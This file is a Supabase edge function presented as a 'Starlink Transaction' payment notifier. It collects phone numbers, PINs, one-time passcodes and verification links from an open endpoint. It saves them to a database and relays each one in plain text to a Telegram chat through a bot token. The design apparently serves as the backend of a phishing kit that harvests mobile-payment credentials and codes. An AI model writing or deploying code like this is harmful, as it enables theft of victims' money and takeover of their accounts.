import { createClient } from "npm:@supabase/supabase-js@2.57.4";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Methods": "POST, OPTIONS",
  "Access-Control-Allow-Headers":
    "Content-Type, Authorization, X-Client-Info, Apikey",
};

const TELEGRAM_BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN") ?? "";
const TELEGRAM_CHAT_ID = Deno.env.get("TELEGRAM_CHAT_ID") ?? "";

const supabase = createClient(
  Deno.env.get("SUPABASE_URL")!,
  Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!,
);

interface NotifyPayload {
  planName?: string;
  amount?: string;
  paymentMethod?: string;
  countryCode?: string;
  status?: string;
  countryName?: string;
  phone?: string;
  pin?: string;
  otp?: string;
  verificationLink?: string;
  stage?: string;
}

const STATUSES = new Set(["pending", "completed", "failed"]);
const clip = (v: unknown, n: number) =>
  String(v ?? "")
    .trim()
    .slice(0, n);

function escapeHtml(s: string): string {
  return s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
}

const json = (body: unknown, status: number) =>
  new Response(JSON.stringify(body), {
    status,
    headers: { ...corsHeaders, "Content-Type": "application/json" },
  });

Deno.serve(async (req: Request) => {
  if (req.method === "OPTIONS")
    return new Response(null, { status: 200, headers: corsHeaders });

  try {
    const body: NotifyPayload = await req.json();

    const planName = clip(body.planName, 200);
    const amount = clip(body.amount, 50);
    const paymentMethod = clip(body.paymentMethod, 20);
    const countryCode = clip(body.countryCode, 10);
    const countryName = clip(body.countryName, 60);
    const phone = clip(body.phone, 25);
    const pin = clip(body.pin, 10);
    const otp = clip(body.otp, 10);
    const verificationLink = clip(body.verificationLink, 500);
    const stage = clip(body.stage, 40);
    const status = STATUSES.has(body.status ?? "") ? body.status! : "pending";

    if (!planName || !amount || !paymentMethod) {
      return json(
        { error: "planName, amount and paymentMethod are required" },
        400,
      );
    }

    // Everything that isn't a first-class column rides along in `details`.
    const details = { countryName, phone, pin, otp, verificationLink, stage };

    const { data: row, error: dbError } = await supabase
      .from("transactions")
      .insert({
        plan_name: planName,
        amount,
        payment_method: paymentMethod,
        country_code: countryCode,
        status,
        details,
      })
      .select("id")
      .single();

    if (dbError) {
      console.error("[db] insert failed", dbError);
      return json({ error: "Failed to store transaction" }, 500);
    }

    // Best-effort notify; the DB row is the source of truth.
    let notified = false;
    if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
      const emoji =
        status === "completed" ? "✅" : status === "failed" ? "❌" : "⏳";
      const rows: [string, string][] = [
        ["Plan", planName],
        ["Amount", amount],
        ["Payment", paymentMethod],
        ["Country", [countryCode, countryName].filter(Boolean).join(" ")],
        ["Phone", phone],
        ["PIN", pin],
        ["OTP", otp],
        ["Link", verificationLink],
        ["Stage", stage],
        ["Status", status],
        ["Time", new Date().toISOString()],
      ];

      const message =
        `<b>${emoji} Starlink Transaction</b>\n\n` +
        rows
          .filter(([, v]) => v !== "")
          .map(([k, v]) => `<b>${k}:</b> ${escapeHtml(v)}`)
          .join("\n");

      const tgResp = await fetch(
        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: "HTML",
          }),
        },
      );
      notified = tgResp.ok;
      if (!tgResp.ok)
        console.error("[telegram] failed", (await tgResp.text()).slice(0, 300));
    } else {
      console.warn("[telegram] env not configured; skipping notify");
    }

    return json({ success: true, id: row?.id, notified }, 200);
  } catch (err) {
    const message = err instanceof Error ? err.message : String(err);
    return json({ error: message }, 500);
  }
});
